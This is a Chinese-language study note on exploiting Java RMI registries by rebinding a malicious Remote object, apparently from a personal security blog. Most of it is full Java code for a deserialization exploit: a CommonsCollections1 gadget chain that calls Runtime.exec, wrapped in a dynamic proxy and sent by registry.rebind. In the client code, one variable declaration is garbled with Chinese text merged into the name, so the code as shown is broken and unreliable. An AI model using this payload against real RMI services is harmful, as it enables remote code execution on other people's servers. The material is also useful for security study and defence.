

#  攻击RMI

## 利用RMI重绑定rebind与动态代理机制构造恶意Remote对象触发CC1

### 环境配置：

还是jdk1,7和cc包3.1

```xml
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
</dependencies>
```
###  原理

RMI在传输过程中：会将对象进行序列化与反序列化，这个被传输的对象是Remote类。那么只要构建恶意Remote对象即可在远程服务器触发反序列化漏洞。

在Client端获取远程registery对象后，可以利用bind/rebind绑定一个包含反序列化漏洞的Remote对象（Stub），Server端接收到bind/rebind后就会反序列化触发漏洞。

### 流程

1. 构建AnnotationInvocationHandler触发CC1
2. 动态代理生成包含AnnotationInvocationHandler的Remote对象
3. 获取远程Registry
4. Registry重绑定发送恶意Remote对象
5. Server端触发反序列化

###  payload

server端：

还是创建一个服务

```java
package RMI;


import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry= LocateRegistry.createRegistry(1088);
        registry.bind("test",new RMIImpl());
        System.out.println("Server is running!!!");
    }
}

```

client端：

```java
package RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class Client {
    public static void main(String[] args) throws Exception {
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);
        InvokerTransformer it1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]});
        InvokerTransformer it2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]});
        InvokerTransformer it3 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        Transformer[] transformers = new Transformer[]{ct, it1, it2, it3};
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put("value", "value");

        Map transformermap = TransformedMap.decorate(map, null, chainedTransformer);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        //因为要生成一个remote对象，刚好可以利用动态代理绑定chainhandler生成一个remote对象，相当于转换了一个对象
        InvocationHandler chainhandler生成一个remote对象 = (InvocationHandler) constructor.newInstance(Target.class, transformermap);
        Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Remote.class}, chainhandler);

        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1088);
        registry.rebind("hacked", remote);
    }
}

```

##  参考文章--待继续学习

https://xz.aliyun.com/t/7932

https://su18.org/post/rmi-attack/#1-%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C

(https://www.anquanke.com/post/id/200860 , https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg)

http://tttang.com/archive/1430/#toc_0x02

https://paper.seebug.org/1251/#java-rmi-

